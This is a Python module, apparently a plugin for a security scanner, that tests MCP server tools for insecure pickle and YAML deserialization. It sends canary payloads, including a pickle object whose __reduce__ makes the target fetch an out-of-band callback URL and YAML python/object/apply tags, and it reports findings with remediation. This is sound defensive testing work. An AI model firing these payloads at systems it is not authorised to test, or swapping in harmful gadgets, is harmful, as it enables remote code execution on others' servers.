"""
Insecure Deserialization audit for MCP tools.

Targets:
  - Python pickle (the ACE classic)
  - YAML with yaml.load() default (FullLoader/Loader)
  - PHP serialized objects (O:8:"stdClass"...)
  - Java ObjectInputStream markers (AC ED 00 05)

Method
------
Two phases:

1. Benign-marker probes — send serialized payloads whose *constructors*
   produce a harmless canary string. If the canary appears in output,
   deserialization executed attacker-controlled code (pickle __reduce__,
   yaml python/object).

2. OOB-confirmed probes — send payloads whose __reduce__ performs an
   HTTP GET to the Minerva canary URL. A callback hit is the
   proof-of-exploit.

Non-destructive: the payloads never write files, spawn shells, or
exhaust resources.
"""

import base64 as _b64
import pickle as _pickle
import urllib.request


class _OOBTrigger:
    """__reduce__ fires urlopen on deserialization. The canary URL is
    captured at pickling time."""
    def __init__(self, url: str):
        self.url = url
    def __reduce__(self):
        return (urllib.request.urlopen, (self.url,))


class _CanaryTrigger:
    """__reduce__ returns the canary string on unpickle."""
    def __init__(self, value: str):
        self.value = value
    def __reduce__(self):
        # Return a tuple whose reconstructor produces the canary string
        return (str, (self.value,))


def _pickle_b64(obj) -> str:
    return _b64.b64encode(_pickle.dumps(obj)).decode()


_YAML_CANARY_TEMPLATE = (
    "!!python/object/apply:builtins.str\n"
    "- {canary}\n"
)

_YAML_OOB_TEMPLATE = (
    "!!python/object/apply:urllib.request.urlopen\n"
    "- {url}\n"
)


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "insecure_deserialization"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    oob_wait = int(params.get("oob_wait_seconds", 20))
    only_tool_names = params.get("only_tool_names") or []

    mcp = mcp_client.MCPClient.from_target(target, timeout=timeout)
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            errs = disc.get("errors") or []
            detail = errs[0] if errs else {}
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(
                f"MCP initialize failed. step={detail.get('step','init')} "
                f"status={init_resp.get('status')} "
                f"transport={init_resp.get('transport')} "
                f"error={detail.get('error') or init_resp.get('error')} "
                f"target_base_url={target.get('base_url')}")
            rb.add_evidence(evidence.ev_mcp_call(
                init_resp, note="failed initialize"))
            return rb.finalize(success=False)
        tools = disc.get("tools") or []
        cands = _pick(tools, only_tool_names)
        if not cands:
            rb.warn("No deserialization-surface tools matched.")
            return rb.finalize(success=True)
        rb.info(f"Candidate tools: {[t.get('name') for t in cands]}")

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = [n for n, s in (schema.get("properties") or {}).items()
                          if isinstance(s, dict) and s.get("type") == "string"]
            if not str_params:
                continue
            for pname in str_params:
                # --- 1. Pickle canary ---
                canary = "DESER_" + context.get("attack_id", "x")[:8]
                payload_b64 = _pickle_b64(_CanaryTrigger(canary))
                args = _fill_defaults(schema)
                args[pname] = payload_b64
                r = mcp.call_tool_safe(tname, args)
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"pickle canary probe {tname}[{pname}]"))
                if canary in (r.get("text_output") or ""):
                    rb.add_finding(_build(
                        "pickle",
                        f"Insecure pickle deserialization on '{tname}'",
                        tname, pname, payload_b64, r, context,
                        impact_extra=(
                            "Pickle deserialization is Turing-complete — "
                            "any attacker-controlled __reduce__ runs arbitrary "
                            "Python code at load time."
                        ),
                    ))
                    break

                # --- 2. YAML canary ---
                yaml_canary = "YAML_" + context.get("attack_id", "x")[:8]
                yaml_doc = _YAML_CANARY_TEMPLATE.format(canary=yaml_canary)
                args2 = _fill_defaults(schema); args2[pname] = yaml_doc
                r2 = mcp.call_tool_safe(tname, args2)
                rb.add_evidence(evidence.ev_mcp_call(
                    r2, note=f"yaml canary probe {tname}[{pname}]"))
                if yaml_canary in (r2.get("text_output") or ""):
                    rb.add_finding(_build(
                        "yaml",
                        f"Unsafe YAML load on '{tname}'",
                        tname, pname, yaml_doc, r2, context,
                        impact_extra=(
                            "yaml.load() (non-safe) executes arbitrary Python "
                            "during parsing. Use yaml.safe_load()."
                        ),
                    ))
                    break

                # --- 3. Pickle OOB (works even when output is suppressed) ---
                token = oob.mint(attack_id="deser", ttl=oob_wait + 20,
                                 metadata={"tool": tname, "param": pname})
                oob_payload_b64 = _pickle_b64(_OOBTrigger(token.url))
                args3 = _fill_defaults(schema); args3[pname] = oob_payload_b64
                r3 = mcp.call_tool_safe(tname, args3)
                rb.add_evidence(evidence.ev_mcp_call(
                    r3, note=f"pickle OOB probe {tname}[{pname}]"))
                hits = oob.wait(token.token, timeout=oob_wait)
                oob.release(token.token)
                if hits:
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id",
                                               "insecure_deserialization"),
                        title=(f"Insecure deserialization CONFIRMED via "
                               f"pickle OOB on '{tname}' / '{pname}'"),
                        category="insecure_deserialization",
                        severity="critical",
                        confidence="confirmed",
                        cwe="CWE-502",
                        tool=tname, parameter=pname, payload=oob_payload_b64,
                        description=(
                            "A pickle payload whose __reduce__ triggers an "
                            "outbound HTTP GET caused the target to reach "
                            "the Minerva canary URL. Arbitrary code execution "
                            "via deserialization is confirmed with side-"
                            "channel proof."
                        ),
                        impact=(
                            "Full RCE. Attacker can chain any Python gadget "
                            "(subprocess.Popen, os.system, eval)."
                        ),
                        remediation=(
                            "Never pickle.loads() untrusted input. Use JSON "
                            "or protobuf. If legacy pickles must be read, "
                            "use restricted unpicklers with class allow-lists."
                        ),
                        references=[
                            "https://cwe.mitre.org/data/definitions/502.html",
                        ],
                        evidence=[
                            evidence.ev_oob_hit(token.token, hits),
                            evidence.ev_mcp_call(r3),
                        ],
                    ))
                    break
        return rb.finalize()
    finally:
        mcp.close()


def _pick(tools, force):
    if force:
        return [t for t in tools if t.get("name") in set(force)]
    kws = ("load", "deserialize", "deserialise", "pickle", "parse",
           "import_", "restore", "unmarshal", "yaml", "config")
    out = [t for t in tools
           if any(k in f"{t.get('name','')} {t.get('description','')}".lower()
                  for k in kws)]
    # Also include eval/exec-style tools since they often deserialize too
    out += [t for t in tools
            if any(k in f"{t.get('name','')} {t.get('description','')}".lower()
                   for k in ("eval", "exec"))
            and t not in out]
    return out


def _build(flavor, title, tname, pname, payload, resp, context, *,
           impact_extra=""):
    return evidence.Finding(
        attack_id=context.get("attack_id", "insecure_deserialization"),
        title=title,
        category="insecure_deserialization",
        severity="critical",
        confidence="confirmed",
        cwe="CWE-502",
        tool=tname, parameter=pname, payload=payload[:400],
        description=(
            f"{flavor}-based deserialization executed attacker-controlled "
            "logic and produced a canary string in the tool response."
        ),
        impact=("Arbitrary code execution at load time. " + impact_extra).strip(),
        remediation=(
            "Never accept serialized Python / YAML / Java objects from tool "
            "inputs. Use JSON with strict schema validation."
        ),
        evidence=[evidence.ev_mcp_call(resp, note=f"{flavor} deser proof")],
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    )


def _fill_defaults(schema):
    out = {}
    props = (schema or {}).get("properties") or {}
    for n in ((schema or {}).get("required") or []):
        t = ((props.get(n) or {}).get("type"))
        out[n] = {"string": "a", "integer": 1, "number": 1,
                  "boolean": False, "array": [], "object": {}}.get(t, "")
    return out
